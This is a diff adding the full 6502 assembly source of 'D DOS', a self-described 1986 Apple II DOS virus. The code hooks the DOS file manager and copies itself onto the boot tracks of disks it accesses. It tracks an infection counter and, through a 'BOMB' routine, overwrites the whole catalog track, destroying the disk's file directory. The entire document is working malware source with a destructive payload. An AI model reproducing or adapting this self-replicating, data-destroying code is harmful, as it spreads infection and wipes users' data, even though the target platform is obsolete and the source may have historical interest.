@@ -1,0 +1,302 @@
+			; *************************
+			; *                       *
+			; *         D DOS         *
+			; *                       *
+			; * A DOS VIRAL INFECTION *
+			; *                       *
+			; *       (C) 1986        *
+			; *                       *
+			; *      THE STUDENT      *
+			; *           &           *
+			; *       THE HAWK        *
+			; *                       *
+			; *************************
+			;
+			;
+			; DOS & MONITOR EQUATES
+			; ---------------------
+			;
+BUFFER 	EQU $9A00	;Buffer used by D DOS
+DCOUNT 	EQU BUFFER+$6	;Disk count lsb in buffer
+			;DCOUNT+1 is msb
+SSAV1 	EQU $B39B	;Address used by DOS
+FMDRVN 	EQU $B5C0	;Drive used by FM
+FMSLTN 	EQU $B5C1	;Slot used by FM
+RWTS 	EQU $B7B5	;RWTS subroutine
+BUFCOPY EQU BUFFER+$5D	;Tk0,Sc1 modification address
+RSTFMW 	EQU $AE6A	;Restores FM workarea
+SUBCODE EQU $B5BC	;Current FM sub-op
+			;
+			;
+			; Remember $9D00:D9 99 for the
+			; file buffer modification
+			;
+	ORG $AB06
+	OBJ $800
+			;
+			;
+			; Replacement code to patch
+			; into the file manager
+			; -------------------------
+			;
+FILMGR 	TSX
+	STX SSAV1
+	JSR DDOS	;Jump to DDOS immediately
+			;
+			;
+			;
+	ORG $B75D
+	OBJ $800
+			;
+			;
+			; Replacement code to patch
+			; into the DOS copying routine
+			; ----------------------------
+			;
+DOSCOPY	LDA #$1B	;Set the count to
+	STA $B7E1	;$1B so as to copy
+	LDA #$02	;sectors 0A & 0B of
+	STA $B7EC	;Track 0
+	LDA #$04
+	STA $B7ED	;*D DOS is stored on
+	LDA #$02	;Tk 0, Sc 0A
+	STA $B7F4
+	JSR $B793
+	LDA $B7E7
+	STA $B6FE
+	CLC
+	ADC #$09
+	STA $B7F1
+	LDA #$0A
+	STA $B7E1
+	SEC
+	SBC #$01
+	STA $B6FF
+	STA $B7ED
+	JSR $B793
+	RTS
+			;
+			;
+			;
+	ORG $9B00
+	OBJ $800
+			;
+			;
+			; Subroutine to read/write a
+			; sector. X holds Tk, Y holds
+			; Sc, A holds R/W command
+			; ---------------------------
+			;
+GETSC	STX IBTRK	;Store track in IOB
+	STY IBSC	;Store sctr in IOB
+	STA IBCMD	;Store cmmnd in IOB
+	LDA /IOB	; ** Drive & buffer
+	LDY #IOB	; ** set externally
+	JSR RWTS	;Do the RWTS
+	RTS
+MCOUNT	HEX 0004	;Memory count (lsb & msb)
+BOOTCNT	HEX 03		;Stops DDOS interrupting bootup
+COUNT	HEX 10		;Used as a temp count
+			;
+			;
+			;
+			;
+			; D DOS Entry point
+			; -----------------
+			;
+			;
+DDOS	PHP		;Push all registers
+	PHA
+	TXA
+	PHA
+	TYA
+	PHA
+	LDA BOOTCNT	;Test BOOTCNT
+	BEQ DDOS2	;If not +ve,goto DDOS
+	BMI DDOS2
+	DEC BOOTCNT	;else dec BOOTCNT
+	JMP RESTOR	;and bypass DDOS
+			;
+DDOS2	JSR RSTFMW 	;Restore FM workarea
+	LDA SUBCODE	;Is FM acessing catalog?
+	BEQ >1		;Yes, do DDOS
+	JMP RESTOR	;else go to DOS
+^1	LDA FMDRVN	;Get drive user wants
+	BEQ GETCAT	;If 0, use last value
+	STA IBDRVN	;We want it too!
+	LDA FMSLTN	;Get the slot also
+	ASL		;Multiply by 16 to
+	ASL		;conform to the RWTS
+	ASL
+	ASL
+	STA IBSLT
+			;
+GETCAT	LDA #BUFFER	;Set up I/O buffer
+	STA IBBUFR
+	LDA /BUFFER
+	STA IBBUFR+1
+	LDX #$11	;Set Tk11,Sc0F,read
+	LDY #$0F
+	LDA #$01
+	JSR GETSC	;Get the sector
+	BCS ERROR	;Error, inform DOS
+	LDA BOOTCNT	;Is it 0?
+	BNE CHECKID	;No, continue with DDOS
+	DEC BOOTCNT	;else dec BOOTCNT
+	LDA DCOUNT	;and copy DCOUNT
+	STA MCOUNT	;into memory
+	LDA DCOUNT+1
+	STA MCOUNT+1
+CHECKID	LDA #$48	;Is it DDOS?
+	CMP BUFFER+3
+	BNE COPYDOS	;No, COPYDOS
+	LDA #$26
+	CMP BUFFER+4
+	BNE COPYDOS	;No, COPYDOS
+	LDA #$53
+	CMP BUFFER+5
+	BNE COPYDOS	;No, COPYDOS
+			;
+CHEKMCNT LDA MCOUNT	;Is MCOUNT=0?
+	ORA MCOUNT+1
+	BEQ BOMB2	;Yes, BOMB
+			;
+DECMCNT	DEC MCOUNT	;Dec MCOUNT lsb
+	LDA MCOUNT	;Is it #$FF?
+	CMP #$FF
+	BNE COMPCNT	;No, don't lower msb
+	DEC MCOUNT+1
+			;
+COMPCNT	LDA DCOUNT+1	;Check DCOUNT>=MCOUNT
+	CMP MCOUNT+1
+	BMI RESTOR	;No, restore
+	BEQ COMPCNT2	;Equal? Test again
+	BPL COPYCNT	;Else COPYCOUNT
+COMPCNT2 LDA DCOUNT	;Compare lsb's
+	CMP MCOUNT
+	BMI RESTOR	;No, restore
+			;
+COPYCNT	LDA MCOUNT	;Copy MCOUNT to buffer
+	STA DCOUNT
+	LDA MCOUNT+1
+	STA DCOUNT+1
+	LDX #$11	;and copy to disk
+	LDY #$0F
+	LDA #$02
+	JSR GETSC	;Done!
+			;
+RESTOR	PLA		;Pull registers
+	TAY
+	PLA
+	TAX
+	PLA
+	PLP
+	JMP $AE6A	;and go back to DOS
+			;
+			;
+BOMB2	JMP BOMB	;Jump to BOMB routine
+			;
+			;
+ERROR	PLA		;Pull all off stack
+	PLA
+	PLA
+	PLA
+	LDX #$08	;Set I/O ERROR
+	STX $AA5C	;and store in DOS
+	JMP $A6D5	;then jump to error handler
+			;
+			;
+			;
+			; Copydos: We must first modify Tk0,Sc1
+			; as it contains the 'state' of DOS at
+			; bootup. We must also copy Tk0,Sc0A-0C,
+			; Tk1,Sc0A and Tk11,Sc0F
+			;
+COPYDOS	LDA #$48	;First set DDOS idbytes
+	STA BUFFER+3	;in Tk11,ScF
+	LDA #$26
+	STA BUFFER+4
+	LDA #$53
+	STA BUFFER+5
+	LDA MCOUNT	;Copy MCOUNT to disk
+	STA DCOUNT
+	LDA MCOUNT+1
+	STA DCOUNT+1
+	LDX #$11
+	LDY #$0F
+	LDA #$02
+	JSR GETSC	;Done!
+	BCS RESTOR	;If error, return to DOS
+	LDX #$00
+	LDY #$01
+	TYA		;Read Tk0,Sc1 into buffer
+	JSR GETSC	;Done!
+	LDX #$37	;Set X=54
+LOOP1	LDA DOSCOPY,X	;Modify sector
+	STA BUFCOPY,X
+	DEX		;Decrement X register
+	BPL LOOP1
+	INX		;Now save Tk0,Sc0A
+	LDY #$01	;Modified, now save back
+	LDA #$02	;to disk
+	JSR GETSC
+	LDA /$9B00	;Now save Tk0,ScA
+	STA IBBUFR+1
+	LDA #$04	;Init BOOTCNT
+	STA BOOTCNT
+	LDX #$00
+	LDY #$0A
+	LDA #$02
+	JSR GETSC	;Done!
+	LDA #$FF	;Restore BOOTCNT
+	STA BOOTCNT	;to normal value
+	INC IBBUFR+1	;Now Tk0,ScB
+	LDX #$00
+	LDY #$0B
+	LDA #$02
+	JSR GETSC	;Done!
+	INC IBBUFR+1	;Now Tk0,ScC
+	LDX #$00
+	LDY #$0C
+	LDA #$02
+	JSR GETSC	;Done!
+	LDA /$AB00	;Now Tk1,ScA
+	STA IBBUFR+1
+	LDX #$01
+	LDY #$0A
+	LDA #$02
+	JSR GETSC	;Done!
+	JMP RESTOR	;and go to DOS
+			;
+BOMB	LDA #$AB	;Make a strange buffer
+	STA BUFFER+1
+	LDA #$10	;Overwrite all of
+	STA COUNT	;track $11 !
+LOOP2	DEC COUNT	;Decrement the counter
+	LDX #$11
+	LDY COUNT
+	LDA #$02
+	JSR GETSC	;Write the sector!
+	LDY COUNT	;If count >0, loop
+	BNE LOOP2
+	JMP RESTOR	;and return to DOS
+			;
+			;
+			;
+IOB	HEX 01		;IOB starts here
+IBSLT	HEX 60		;IOB slot
+IBDRVN	HEX 01		;IOB drive
+IBVOL	HEX 00		;IOB volume
+IBTRK	HEX 00		;IOB track
+IBSC	HEX 00		;IOB sector
+IBDCT	ADR DCT		;DCT address
+IBBUFR	HEX 0000	;IOB buffer
+	HEX 0000
+IBCMD	HEX 00		;IOB command
+IBSTAT	HEX 00		;IOB errors
+	HEX 006001
+			;
+DCT	HEX 0001EFD8
+			;
+			;
+	END
